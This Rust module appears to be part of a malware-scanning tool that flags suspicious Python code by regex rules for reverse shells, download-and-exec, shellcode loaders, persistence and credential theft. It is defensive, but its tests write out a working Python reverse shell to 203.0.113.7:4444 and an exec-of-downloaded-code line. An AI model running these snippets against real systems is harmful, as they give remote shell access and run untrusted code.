//! Heuristic flags for suspicious behavior in Python code. These are pattern
//! matches, not proof: the UI labels them as heuristics. Each rule fires at
//! most once per layer and reports the first matching line.

use std::sync::LazyLock;

use regex::Regex;
use serde::Serialize;

#[derive(Debug, Clone, Copy, Serialize, PartialEq, Eq, PartialOrd, Ord)]
#[serde(rename_all = "lowercase")]
pub enum Level {
    Info,
    Warn,
    Fail,
}

#[derive(Debug, Clone, Serialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct Flag {
    pub level: Level,
    pub rule: &'static str,
    pub title: &'static str,
    pub detail: String,
    pub layer: usize,
    /// 1-based line in that layer, when known.
    pub line: Option<usize>,
    /// The matching line, trimmed and shortened.
    pub snippet: String,
}

struct Rule {
    id: &'static str,
    level: Level,
    title: &'static str,
    detail: &'static str,
    /// Every pattern must match somewhere in the layer; the first one locates
    /// the line.
    all: Vec<Regex>,
}

fn rule(
    id: &'static str,
    level: Level,
    title: &'static str,
    detail: &'static str,
    all: &[&str],
) -> Rule {
    Rule {
        id,
        level,
        title,
        detail,
        all: all
            .iter()
            .map(|p| Regex::new(p).expect("valid rule regex"))
            .collect(),
    }
}

static RULES: LazyLock<Vec<Rule>> = LazyLock::new(|| {
    vec![
        rule(
            "download-exec",
            Level::Fail,
            "Downloads and runs code",
            "Fetches content over the network and passes code to exec, eval, a shell, or marks a file executable.",
            &[
                r"\b(?:urlopen|urlretrieve|requests\.(?:get|post)|http\.client|urllib\.request|wget|curl)\b",
                r"\b(?:exec|eval)\s*\(|\bos\.system\b|\bsubprocess\b|\bchmod\b|\bos\.chmod\b",
            ],
        ),
        rule(
            "reverse-shell",
            Level::Fail,
            "Reverse shell pattern",
            "Opens a socket, connects out, and wires it to a shell or the process's stdin/stdout.",
            &[
                r"\bsocket\.socket\b|\bsocket\(\s*socket\.AF_INET",
                r"\.connect\s*\(",
                r"\bos\.dup2\b|\bpty\.spawn\b|/bin/(?:ba|z)?sh\b",
            ],
        ),
        rule(
            "shellcode",
            Level::Fail,
            "Shellcode loader pattern",
            "Uses ctypes to allocate executable memory or start a thread, typical of in-memory payload loaders.",
            &[
                r"\bctypes\b",
                r"\bVirtualAlloc\b|\bVirtualProtect\b|\bCreateThread\b|\bRtlMoveMemory\b|PROT_EXEC|\bmprotect\b",
            ],
        ),
        rule(
            "persistence",
            Level::Fail,
            "Persistence mechanism",
            "Touches autostart locations: cron, shell profiles, systemd units, LaunchAgents, Run keys or scheduled tasks.",
            &[
                r"crontab|/etc/cron|\.bashrc|\.bash_profile|\.zshrc|\.profile\b|systemd/system|\.service\b|LaunchAgents|LaunchDaemons|\\CurrentVersion\\Run|\bwinreg\b|schtasks|\\Startup\\",
            ],
        ),
        rule(
            "cred-access",
            Level::Warn,
            "Reads credentials or secrets",
            "References SSH keys, password files, browser credential stores, keychains or cloud credentials.",
            &[
                r"\.ssh/id_|/etc/shadow|/etc/passwd|Login Data|\bCookies\b|keychain|\.aws/credentials|AWS_SECRET|\.kube/config|wallet\.dat",
            ],
        ),
        rule(
            "shell",
            Level::Warn,
            "Runs shell commands",
            "Starts processes through os.system, os.popen, subprocess or pty.",
            &[
                r"\bos\.(?:system|popen|exec[lv]p?e?)\b|\bsubprocess\.(?:Popen|call|run|check_output|check_call|getoutput)\b|\bpty\.spawn\b|\bcommands\.getoutput\b",
            ],
        ),
        rule(
            "bytecode",
            Level::Warn,
            "Loads serialized code",
            "marshal, pickle or types.CodeType can load and run code that never appears as source.",
            &[r"\bmarshal\.loads\b|\bpickle\.loads?\b|\btypes\.CodeType\b|\bdill\.loads\b"],
        ),
        rule(
            "self-delete",
            Level::Warn,
            "Deletes itself or cleans up traces",
            "Removes its own file or wipes directories, often to hinder analysis.",
            &[r"\bos\.(?:remove|unlink)\s*\(\s*(?:__file__|sys\.argv\[0\])|\bshutil\.rmtree\b"],
        ),
        rule(
            "anti-analysis",
            Level::Info,
            "Anti-analysis checks",
            "Long sleeps, VM or sandbox names, or debugger checks.",
            &[
                r"\bsleep\s*\(\s*\d{3,}|\bVirtualBox\b|\bvmware\b|\bVBOX\b|\bsandbox\b|\bIsDebuggerPresent\b|\bsys\.gettrace\b",
            ],
        ),
        rule(
            "dynamic-import",
            Level::Info,
            "Dynamic imports or attribute lookups",
            "__import__, importlib, getattr on builtins or globals() hide what is called.",
            &[
                r"\b__import__\s*\(|\bimportlib\b|getattr\s*\(\s*__builtins__|\bglobals\s*\(\s*\)\s*\[",
            ],
        ),
        rule(
            "xor",
            Level::Info,
            "XOR decoding loop",
            "Characters combined with a key by XOR, a common light obfuscation.",
            &[r"\bord\s*\([^)]*\)\s*\^|\^\s*ord\s*\(|\bchr\s*\([^)]*\^"],
        ),
        rule(
            "network",
            Level::Info,
            "Network access",
            "Uses sockets or HTTP, FTP, SMTP or Telnet clients.",
            &[
                r"\bsocket\.|\brequests\.|\burllib\b|\bhttp\.client\b|\bftplib\b|\bsmtplib\b|\btelnetlib\b|\bparamiko\b",
            ],
        ),
    ]
});

fn snippet(line: &str) -> String {
    let t = line.trim();
    if t.chars().count() > 160 {
        let s: String = t.chars().take(157).collect();
        format!("{s}...")
    } else {
        t.to_string()
    }
}

/// Run every rule over one layer's text.
pub fn scan(text: &str, layer: usize) -> Vec<Flag> {
    let mut out = Vec::new();
    for r in RULES.iter() {
        if !r.all.iter().all(|re| re.is_match(text)) {
            continue;
        }
        let first = r.all[0].find(text).map(|m| m.start()).unwrap_or(0);
        let line_no = text[..first].matches('\n').count() + 1;
        let line_text = text.lines().nth(line_no - 1).unwrap_or("");
        out.push(Flag {
            level: r.level,
            rule: r.id,
            title: r.title,
            detail: r.detail.to_string(),
            layer,
            line: Some(line_no),
            snippet: snippet(line_text),
        });
    }
    out
}

/// A flag for a layer that the code executes after decoding.
pub fn exec_flag(
    sink: &str,
    layer: usize,
    parent: usize,
    line: usize,
    steps: &str,
    src_line: &str,
) -> Flag {
    Flag {
        level: Level::Fail,
        rule: "exec-decoded",
        title: "Executes decoded code",
        detail: format!(
            "Layer {parent} decodes ({steps}) and passes the result to {sink}(); see layer {layer}."
        ),
        layer: parent,
        line: Some(line),
        snippet: snippet(src_line),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rules(text: &str) -> Vec<&'static str> {
        scan(text, 0).into_iter().map(|f| f.rule).collect()
    }

    #[test]
    fn reverse_shell() {
        let src = "import socket,os,pty\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('203.0.113.7',4444))\nos.dup2(s.fileno(),0)\npty.spawn('/bin/sh')";
        let r = rules(src);
        assert!(r.contains(&"reverse-shell"));
        assert!(r.contains(&"shell"));
        assert!(r.contains(&"network"));
        let f = scan(src, 2)
            .into_iter()
            .find(|f| f.rule == "reverse-shell")
            .unwrap();
        assert_eq!(f.line, Some(2));
        assert_eq!(f.layer, 2);
    }

    #[test]
    fn download_and_exec() {
        let r = rules("import urllib.request\nexec(urllib.request.urlopen('http://x').read())");
        assert!(r.contains(&"download-exec"));
    }

    #[test]
    fn clean_code_has_no_flags() {
        assert!(rules("def add(a, b):\n    return a + b\nprint(add(1, 2))").is_empty());
    }

    #[test]
    fn persistence_and_creds() {
        let r =
            rules("open(os.path.expanduser('~/.bashrc'),'a')\nopen('/home/u/.ssh/id_rsa').read()");
        assert!(r.contains(&"persistence") && r.contains(&"cred-access"));
    }

    #[test]
    fn long_snippets_are_shortened() {
        let src = format!("os.system('{}')", "a".repeat(500));
        let f = &scan(&src, 0)[0];
        assert!(f.snippet.ends_with("...") && f.snippet.chars().count() == 160);
    }
}
